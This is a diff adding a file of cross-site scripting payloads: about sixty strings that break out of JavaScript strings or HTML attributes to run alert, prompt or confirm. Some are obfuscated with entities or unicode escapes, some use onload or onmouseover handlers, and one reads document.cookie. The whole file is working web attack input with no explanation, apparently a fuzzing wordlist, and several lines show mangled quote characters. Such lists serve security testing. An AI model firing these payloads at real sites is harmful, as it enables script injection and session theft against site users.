@@ -1,0 +1,63 @@
+"'-alert(1)-'"
+"-alert(1)-"
+"}]}';alert(1);{{'
+'-alert(1)-'
+'-alert(1)//
+'|alert(1)|'
+'}};alert(1);{{'
+(alert)(1)
+\'-alert(1)//
+\'-alert(1)};{//
+‘)alert(1);//
+‘; alert(1);
+alert`1`
+""});});});alert(1);$('a').each(function(i){$(this).click(function(event){x({y
+\";alert(1015);//
+"+alert(16)+"
+';alert(1625))//';alert(1625))//";
+alert(1626))//";alert(1626))//--
+\";alert(1649);//
+alert(1742));'))">
+'); alert(1788); var x='
+\\'); alert(1789);var x=\'
+';;alert(1873))//\';;alert(1873))//";;alert(1873))//\";;alert(1873))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(1873))<;/SCRIPT>;
+\";;alert(1913);//
+';alert(1974))//\';alert(1974))//";alert(1974))//\";alert(1974))//--></SCRIPT>">'><SCRIPT>alert(1974))</SCRIPT>
+"])},alert(1));(function xss() {//
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+*/alert(1)</script><script>/*
+'>alert(1)</script><script/1=' 
+alert&#40;1&#41
+';alert(711))//';alert(711))//";
+alert(712))//";alert(712))//--
+\";alert(735);//
+‘; alert(800);
+‘)alert(801);//
+‘;alert(839))//’;alert(839))//”;alert(839))//”;alert(839))//–></SCRIPT>”>’><SCRIPT>alert(839))</SCRIPT>
+<"';alert(856))//\';alert(856))//";alert(856))//\";alert(856))//--></SCRIPT>">'><SCRIPT>alert(856))</SCRIPT>
+<"';alert(859))//\';alert(859))//";alert(859))//\";alert(859))//--></SCRIPT>">'><SCRIPT>alert(859))</SCRIPT>
+';alert(860))//\';alert(860))//";alert(860))//\";alert(860))//--></SCRIPT>">'><SCRIPT>alert(860))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
+\\";alert(878);//
+';alert(933))//\';alert(933))//\";alert(933))//\\";alert(933))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(933))&lt;/SCRIPT&gt;
+';alert(934))//\';alert(934))//";alert(934))//\";alert(934))//--></SCRIPT>">'><SCRIPT>alert(934))</SCRIPT>
+\";alert(943);//
+‘; alert(983); var foo=’
+';alert(992))//';alert(992))//";alert(992))//";alert(992))//--></SCRIPT>">'><SCRIPT>alert(992))</SCRIPT>
+‘; alert(document.cookie); var foo=’
+alert&lpar;1&rpar;
+alert;pg("XSS")
+alert&#x28;1&#x29
+'); alert('XSS
+\";;alert(';XSS';);//
+\";alert('XSS');//
+\\";alert('XSS');//
+'); alert('xss'); var x='
+\\'); alert(\'xss\');var x=\'
+al\u0065rt(1)
+" onfocus=prompt(1) autofocus fragment="
+'onload=alert(1)><svg/1='
+"onmouseover=alert(1)//
+onmouseover=¡¯alert(9)¡¯
+' onmouseover=alert(/XSS/)
+" onmouseover="confirm(1)"style="position:absolute;width:100%;height:100%;top:0;left:0;"
